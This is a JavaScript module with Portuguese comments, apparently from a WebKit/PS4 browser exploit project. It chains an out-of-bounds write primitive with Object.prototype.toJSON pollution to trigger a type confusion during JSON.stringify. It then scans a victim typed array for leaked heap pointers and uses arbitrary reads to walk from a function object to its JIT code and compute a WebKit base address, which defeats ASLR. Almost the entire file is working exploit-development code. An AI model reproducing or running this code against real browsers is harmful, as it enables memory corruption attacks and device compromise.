// js/script3/testArrayBufferVictimCrash.mjs (R43L - Addrof via Leitura Direta Pós-TC)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_DirectReadAddrof";

const VICTIM_BUFFER_SIZE = 256; // Em bytes. O Uint32Array terá length VICTIM_BUFFER_SIZE / 4
const VICTIM_UINT32_LENGTH = VICTIM_BUFFER_SIZE / 4;

// Parâmetros para testes abrangentes
const CRITICAL_WRITE_OFFSETS_FOR_ADDROF = [
    0x7C, 0x78, 0x80, // Em torno do offset que causa TC
    0x50, 0x60, 0x70, 0x84, 0x88, 0x8C, 0x90 // Testar uma faixa mais ampla
];
const OOB_WRITE_VALUES_FOR_ADDROF = [
    0xABABABAB, 0xCDCDCDCD, 0x12345678, 0x87654321,
    0x00000000, 0xFFFFFFFF,
    JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID || 0x2, // Tentar usar um StructureID conhecido
    // Adicionar outros valores que possam ser significativos (ex: outros StructureIDs, pequenos inteiros)
];

const PROBE_CALL_LIMIT_V82 = 10;
const MAX_VICTIM_ELEMENTS_TO_SCAN_FOR_ADDROF = Math.min(32, VICTIM_UINT32_LENGTH / 2); // Ler até 32 pares de Uint32s

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak; // Usado se addrof for bem-sucedido, para tentar WebKitLeak
let spray_array_for_addrof_target; // Para aumentar a chance de targetFunctionForLeak estar perto de dados corrompidos

// isValidPointer (sem alterações)
function isValidPointer(ptr, context = "") {
    if (!isAdvancedInt64Object(ptr)) {
        logS3(`[isValidPointer-${context}] Input não é AdvancedInt64Object: ${String(ptr)}`, "debug_detail");
        return false;
    }
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high === 0x7FF80000 && low === 0x0) return false;
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) return false;
    if (high === 0 && low < 0x10000) return false;
    // PS4 user-space addresses are typically much lower. This is a loose upper bound.
    // Example: if (high > 0x20) return false; // Endereços de heap JS provavelmente não estarão tão altos.
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Addrof via Leitura Direta Pós-TC ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init DirectReadAddrof...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR43L_DirectRead() { return `target_R43L_DirectRead_${Date.now()}`; };
    // Criar um spray array para aumentar a chance de targetFunctionForLeak estar em uma posição "interessante"
    spray_array_for_addrof_target = [];
    for (let i = 0; i < 10; i++) {
        spray_array_for_addrof_target.push({ a: targetFunctionForLeak, b: Math.random(), c: `spray_data_${i}`});
    }
    logS3(`Função alvo (targetFunctionForLeak) e spray_array criados.`, 'info');

    logS3(`--- Fase 0 (DirectReadAddrof): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try {
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
    } catch (e_sanity) {
        logS3(`Erro Sanity Checks: ${e_sanity.message}`, "critical", FNAME_CURRENT_TEST_BASE); coreOOBReadWriteOK = false;
    }
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) {
        logS3(`Sanity OOB falhou. Abortando.`, "critical"); document.title = `${FNAME_CURRENT_TEST_BASE} OOB Fail!`;
        return { errorOccurred: "OOB Sanity Fail", tc_probe_details: null, addrof_result: { success: false, msg: "Not run" }, webkit_leak_result: { success: false, msg: "Not run" }, iteration_results_summary: [], oob_params_of_best_result: null, heisenbug_on_M2_in_best_result: false };
    }

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null,
        addrof_result: { success: false, msg: "Addrof (DirectRead): Not run.", leaked_object_addr: null, candidate_pointers_found: [] },
        webkit_leak_result: { success: false, msg: "WebKit Leak (DirectRead): Not run.", webkit_base_candidate: null },
        oob_params_of_best_result: null, // { offset: hex, value: hex, raw_value: num, raw_offset: num }
        heisenbug_on_M2_confirmed_by_tc_probe: false,
    };
    let total_probe_calls_last_run = 0;

    for (const current_critical_offset of CRITICAL_WRITE_OFFSETS_FOR_ADDROF) {
        for (const current_oob_value of OOB_WRITE_VALUES_FOR_ADDROF) {
            if (current_oob_value === null || current_oob_value === undefined) continue;

            let leaked_target_function_addr = null; // Reset para esta sub-iteração
            const current_oob_hex_val = toHex(current_oob_value);
            const current_offset_hex = toHex(current_critical_offset);
            const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_OOB${current_oob_hex_val}`;
            logS3(`\n===== ITERATION DirectReadAddrof: Offset: ${current_offset_hex}, OOB Value: ${current_oob_hex_val} =====`, "subtest", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex} Val:${current_oob_hex_val}`;

            let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
            let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
            let iteration_final_tc_details_from_probe = null;
            let iteration_tc_first_detection_done = false;
            let iter_addrof_result = { success: false, msg: "Addrof (DirectRead): Not triggered or no valid ptrs.", leaked_object_addr: null, candidate_pointers_found: [] };

            function toJSON_TA_Probe_Iter_Closure_DirectReadAddrof() {
                probe_call_count_iter++; const call_num = probe_call_count_iter;
                const ctts = Object.prototype.toString.call(this);
                const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');

                try {
                    if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                    if (call_num === 1 && this === victim_typed_array_ref_iter) {
                        marker_M2_ref_iter = { marker_id_direct_read: "M2_Iter_DirectRead" };
                        marker_M1_ref_iter = { marker_id_direct_read: "M1_Iter_DirectRead", payload_M2: marker_M2_ref_iter };
                        logS3(`[PROBE_DirectRead] Call #${call_num}: 'this' é victim_typed_array. M1/M2 criados.`, "debug");
                        return marker_M1_ref_iter;
                    } else if (is_m2c) {
                        if (!iteration_tc_first_detection_done) {
                            iteration_tc_first_detection_done = true;
                            iteration_final_tc_details_from_probe = {
                                call_number_tc_detected: call_num, probe_variant: "TA_Probe_DirectRead", this_type: ctts,
                                this_is_M2: true, notes: "TC Confirmada. Tentando leitura direta do victim_typed_array."
                            };
                            logS3(`[PROBE_DirectRead] Call #${call_num} (M2C): FIRST TC. ID:${this.marker_id_direct_read}. Tentando leitura direta...`, "vuln");

                            if (!victim_typed_array_ref_iter || victim_typed_array_ref_iter.length === 0) {
                                iter_addrof_result.msg = "Addrof (DirectRead): victim_typed_array_ref_iter nulo ou vazio na TC.";
                                logS3(`[PROBE_DirectRead] ERRO: victim_typed_array_ref_iter nulo ou vazio.`, "error");
                                return this; // Retornar para JSON.stringify continuar, mas addrof falhou.
                            }

                            logS3(`[PROBE_DirectRead_ADDROF] Analisando victim_typed_array (length: ${victim_typed_array_ref_iter.length}) para ponteiros...`, "info_emphasis");
                            let found_valid_pointers_in_victim = [];
                            // Ler pares de Uint32s como ponteiros de 64 bits
                            for (let i = 0; i < Math.min(victim_typed_array_ref_iter.length - 1, MAX_VICTIM_ELEMENTS_TO_SCAN_FOR_ADDROF * 2); i += 2) {
                                const low = victim_typed_array_ref_iter[i];
                                const high = victim_typed_array_ref_iter[i+1];
                                const potential_ptr = new AdvancedInt64(low, high);
                                const ptr_str = potential_ptr.toString(true);
                                logS3(`  [ADDROF_SCAN] victim_TA[${i},${i+1}]: low=0x${low.toString(16)}, high=0x${high.toString(16)} => ${ptr_str}`, "leak_detail");

                                if (isValidPointer(potential_ptr, `_victimScan[${i}]`)) {
                                    logS3(`  [ADDROF_SCAN] PONTEIRO VÁLIDO ENCONTRADO: ${ptr_str} no índice ${i} do victim_typed_array.`, "vuln_potential");
                                    found_valid_pointers_in_victim.push(ptr_str);
                                    // Por enquanto, qualquer ponteiro válido é um "sucesso" para addrof.
                                    // Idealmente, precisaríamos de uma forma de confirmar que é o ponteiro de targetFunctionForLeak.
                                    if (!iter_addrof_result.success) { // Pegar o primeiro como "o" endereço vazado por enquanto
                                        leaked_target_function_addr = potential_ptr; // Assumir que este pode ser o da função alvo
                                        iter_addrof_result.leaked_object_addr = ptr_str;
                                    }
                                    iter_addrof_result.success = true; // Marcamos sucesso se qualquer ponteiro válido for encontrado
                                }
                            }

                            iter_addrof_result.candidate_pointers_found = found_valid_pointers_in_victim;
                            if (iter_addrof_result.success) {
                                iter_addrof_result.msg = `Addrof (DirectRead): Sucesso! Encontrados ${found_valid_pointers_in_victim.length} ponteiros válidos. Primeiro: ${iter_addrof_result.leaked_object_addr || 'N/A'}`;
                                logS3(`[PROBE_DirectRead_ADDROF] ${iter_addrof_result.msg}`, "vuln");
                            } else {
                                iter_addrof_result.msg = "Addrof (DirectRead): Nenhum ponteiro válido encontrado no victim_typed_array após TC.";
                                logS3(`[PROBE_DirectRead_ADDROF] ${iter_addrof_result.msg}`, "warn");
                            }
                        }
                        return this; // Para JSON.stringify continuar
                    }
                } catch (e_pm_probe) {
                    iteration_final_tc_details_from_probe = { error_probe: `ProbeMainErr:${e_pm_probe.message}` };
                    console.error("[PROBE_DirectRead] Erro principal na sonda:", e_pm_probe);
                    return { err_pm: call_num, msg: e_pm_probe.message };
                }
                return { gen_m: call_num, type: ctts };
            }

            let iter_primary_error = null;
            let iter_raw_stringify_output = null;
            let iter_stringify_output_parsed = null;
            let heisenbugConfirmedThisIter = false;
            let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (DirectRead): Not run.", webkit_base_candidate: null };


            try {
                logS3(`  --- Fase 1 (DirectReadAddrof): Escrita OOB e Tentativa de Leitura Direta (Off:${current_offset_hex}, Val:${current_oob_hex_val}) ---`, "subtest", FNAME_CURRENT_ITERATION);
                await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
                oob_write_absolute(current_critical_offset, current_oob_value, 4);
                logS3(`   OOB Write: Escrito ${current_oob_hex_val} no offset ${current_offset_hex}`, 'info');
                await PAUSE_S3(50);

                // Usar Uint32Array para o victim_typed_array_ref_iter, pois leremos pares de Uint32
                victim_typed_array_ref_iter = new Uint32Array(VICTIM_BUFFER_SIZE / 4);
                // Preencher com um padrão para ver se ele é sobrescrito pela corrupção OOB
                // Se o addrof funcionar lendo dados corrompidos, este padrão será sobrescrito por esses dados.
                for(let i=0; i<victim_typed_array_ref_iter.length; i++) victim_typed_array_ref_iter[i] = 0xCAFEBABE + i;
                logS3(`   Victim Uint32Array (length ${victim_typed_array_ref_iter.length}) criado e preenchido com padrão.`, 'debug_detail');
                await PAUSE_S3(100);

                logS3(`  --- Tentativa de Detecção de TC e Leitura Direta (DirectReadAddrof) ---`, "subtest", FNAME_CURRENT_ITERATION);
                const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
                try {
                    Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_DirectReadAddrof, writable: true, configurable: true, enumerable: false });
                    polluted = true;
                    iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); // Aciona a sonda
                    try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: iter_raw_stringify_output, msg: e_p.message }; }

                    heisenbugConfirmedThisIter = iteration_final_tc_details_from_probe?.this_is_M2 || false;
                    if (heisenbugConfirmedThisIter) {
                        logS3(`  TC Probe (DirectRead): TC on M2 CONFIRMADA. Addrof success: ${iter_addrof_result.success}. Addr: ${iter_addrof_result.leaked_object_addr || 'N/A'}. Candidates: ${iter_addrof_result.candidate_pointers_found.length}`, iter_addrof_result.success ? "vuln" : "warn", FNAME_CURRENT_ITERATION);
                    } else {
                        logS3(`  TC Probe (DirectRead): TC on M2 NÃO Confirmada. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error", FNAME_CURRENT_ITERATION);
                    }
                } catch (e_str_direct) {
                    if (!iter_primary_error) iter_primary_error = e_str_direct;
                    logS3(`  TC/Addrof Probe (DirectRead): JSON.stringify EXCEPTION: ${e_str_direct.message}`, "error", FNAME_CURRENT_ITERATION);
                } finally {
                    if (polluted) {
                        if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey];
                    }
                }
                logS3(`  --- Fase 1 (DirectReadAddrof) Concluída. TC M2: ${heisenbugConfirmedThisIter}. Addrof Sucesso: ${iter_addrof_result.success} ---`, "subtest", FNAME_CURRENT_ITERATION);
                await PAUSE_S3(100);

                // Fase 2: WebKit Leak (Só tentar se addrof foi bem-sucedido)
                logS3(`  --- Fase 2 (DirectReadAddrof): Teste de WebKit Base Leak ---`, "subtest", FNAME_CURRENT_ITERATION);
                if (iter_addrof_result.success && leaked_target_function_addr) { // leaked_target_function_addr é preenchido na sonda
                    if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-PreArbReadCheck`)) {
                        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-PreArbReadCheckReinit` });
                    }
                    if (!isOOBReady()) {
                        iter_webkit_leak_result.msg = "WebKit Leak (DirectRead): Falha ao preparar OOB para arb_read.";
                        logS3(iter_webkit_leak_result.msg, "error");
                    } else {
                        try {
                            // Assumimos que leaked_target_function_addr é o endereço de targetFunctionForLeak
                            // Se addrof apenas vazou um ponteiro genérico, esta parte pode não ser significativa
                            logS3(`  WebKitLeak: Usando endereço vazado (assumido ser da função alvo): ${leaked_target_function_addr.toString(true)}`, 'info');
                            const ptr_exe = await arb_read(leaked_target_function_addr.add(FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE), 8);
                            if (!isValidPointer(ptr_exe, "_exeInstDirect")) throw new Error(`Ptr ExecutableInstance inválido: ${ptr_exe.toString(true)}`);
                            logS3(`  WebKitLeak: Ptr ExecutableInstance: ${ptr_exe.toString(true)}`, 'leak');
                            const ptr_jit = await arb_read(ptr_exe.add(EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM), 8);
                            if (!isValidPointer(ptr_jit, "_jitVmDirect")) throw new Error(`Ptr JIT/VM inválido: ${ptr_jit.toString(true)}`);
                            logS3(`  WebKitLeak: Ptr JIT/VM: ${ptr_jit.toString(true)}`, 'leak');
                            const base_cand = ptr_jit.and(new AdvancedInt64(0x0, ~0xFFF));
                            iter_webkit_leak_result = { success: true, msg: `Candidato base WebKit: ${base_cand.toString(true)}`, webkit_base_candidate: base_cand.toString(true) };
                            logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");
                        } catch (e_wkleak) {
                            iter_webkit_leak_result.msg = `WebKitLeak (DirectRead) EXCEPTION: ${e_wkleak.message || String(e_wkleak)}`;
                            logS3(`  WebKitLeak: ERRO - ${iter_webkit_leak_result.msg}`, "error");
                            if (!iter_primary_error) iter_primary_error = e_wkleak;
                        }
                    }
                } else {
                    let skipMsg = "WebKitLeak (DirectRead): Pulado. ";
                    if (!iter_addrof_result.success) skipMsg += "Addrof (DirectRead) falhou. ";
                    else if (!leaked_target_function_addr) skipMsg += "Endereço alvo para WebKitLeak não definido (addrof pode ter vazado outro ponteiro).";
                    iter_webkit_leak_result.msg = skipMsg;
                    logS3(iter_webkit_leak_result.msg, "warn");
                }

            } catch (e_outer) {
                if (!iter_primary_error) iter_primary_error = e_outer;
                logS3(`  CRITICAL ERROR ITERATION (Off:${current_offset_hex},Val:${current_oob_hex_val}): ${e_outer.message || String(e_outer)}`, "critical");
            } finally {
                await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearDirectRead` });
            }

            total_probe_calls_last_run = probe_call_count_iter;
            let current_iter_summary = {
                oob_offset: current_offset_hex, oob_value: current_oob_hex_val, raw_oob_value: current_oob_value,
                error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
                tc_probe_details: iteration_final_tc_details_from_probe,
                stringifyResult: iter_stringify_output_parsed, // Mantido para depuração
                addrof_result_this_iter: iter_addrof_result,
                webkit_leak_result_this_iter: iter_webkit_leak_result,
                heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
            };
            iteration_results_summary.push(current_iter_summary);

            // Lógica de best_result_for_runner (priorizar WebKitLeak > Addrof com candidatos > TC)
            if (current_iter_summary.error === null) {
                let current_is_better = false;
                if (best_result_for_runner.errorOccurred !== null || best_result_for_runner.oob_params_of_best_result === null) {
                    current_is_better = true;
                } else {
                    const current_score = (current_iter_summary.webkit_leak_result_this_iter.success ? 4 : 0) +
                                          (current_iter_summary.addrof_result_this_iter.success ? 2 : 0) +
                                          (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                    const best_score = (best_result_for_runner.webkit_leak_result.success ? 4 : 0) +
                                       (best_result_for_runner.addrof_result.success ? 2 : 0) +
                                       (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                    if (current_score > best_score) {
                        current_is_better = true;
                    } else if (current_score === best_score && current_score > 0) { // Se o score é igual e positivo, preferir o que tem mais candidatos addrof
                        if (current_iter_summary.addrof_result_this_iter.candidate_pointers_found.length > best_result_for_runner.addrof_result.candidate_pointers_found.length) {
                            current_is_better = true;
                        }
                    }
                }
                if (current_is_better) {
                    best_result_for_runner = {
                        errorOccurred: null,
                        tc_probe_details: current_iter_summary.tc_probe_details,
                        addrof_result: current_iter_summary.addrof_result_this_iter,
                        webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                        oob_params_of_best_result: { offset: current_offset_hex, value: current_oob_hex_val, raw_value: current_oob_value, raw_offset: current_critical_offset },
                        heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe
                    };
                    logS3(`*** NOVO MELHOR RESULTADO: Off:${current_offset_hex},Val:${current_oob_hex_val}. Addrof:${best_result_for_runner.addrof_result.success}, WKLeak:${best_result_for_runner.webkit_leak_result.success} ***`, "success_major");
                }
            } else if (best_result_for_runner.oob_params_of_best_result === null && current_critical_offset === CRITICAL_WRITE_OFFSETS_FOR_ADDROF[CRITICAL_WRITE_OFFSETS_FOR_ADDROF.length-1] && current_oob_value === OOB_WRITE_VALUES_FOR_ADDROF[OOB_WRITE_VALUES_FOR_ADDROF.length-1]) {
                best_result_for_runner = { ...current_iter_summary, oob_params_of_best_result: { offset: current_offset_hex, value: current_oob_hex_val, raw_value: current_oob_value, raw_offset: current_critical_offset } };
            }
            // Atualizar título da página
            if (iter_webkit_leak_result.success) document.title = `${FNAME_CURRENT_TEST_BASE} WKLeak OK!`;
            else if (iter_addrof_result.success) document.title = `${FNAME_CURRENT_TEST_BASE} Addrof OK (${iter_addrof_result.candidate_pointers_found.length} cands)`;
            else if (heisenbugConfirmedThisIter) document.title = `${FNAME_CURRENT_TEST_BASE} TC OK`;
            else document.title = `${FNAME_CURRENT_TEST_BASE} Iter Done`;
            await PAUSE_S3(100);
        } // Fim loop OOB_WRITE_VALUES
        await PAUSE_S3(200); // Pausa entre offsets
    } // Fim loop CRITICAL_WRITE_OFFSETS

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test");
    if (best_result_for_runner.oob_params_of_best_result) {
        logS3(`Melhor resultado com Params: ${JSON.stringify(best_result_for_runner.oob_params_of_best_result)}`, "info_emphasis");
    }
    logS3(`Best/Final result (DirectReadAddrof): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug");

    let final_title_status = "No Success";
    if (best_result_for_runner.webkit_leak_result.success) final_title_status = "WebKitLeak SUCCESS!";
    else if (best_result_for_runner.addrof_result.success) final_title_status = `Addrof OK (${best_result_for_runner.addrof_result.candidate_pointers_found.length} cands)!`;
    else if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) final_title_status = "TC OK, Addrof Fail";
    else if (best_result_for_runner.errorOccurred) final_title_status = `Error - ${best_result_for_runner.errorOccurred}`;
    document.title = `${FNAME_CURRENT_TEST_BASE}_Final: ${final_title_status}`;

    return {
        errorOccurred: best_result_for_runner.errorOccurred,
        tc_probe_details: best_result_for_runner.tc_probe_details,
        addrof_result: best_result_for_runner.addrof_result,
        webkit_leak_result: best_result_for_runner.webkit_leak_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: total_probe_calls_last_run,
        // Para compatibilidade com o runner original, se ele não for adaptado
        oob_value_of_best_result: best_result_for_runner.oob_params_of_best_result ? best_result_for_runner.oob_params_of_best_result.value : null,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe,
        // Campo mais detalhado para um runner adaptado
        oob_params_of_best_result: best_result_for_runner.oob_params_of_best_result
    };
}
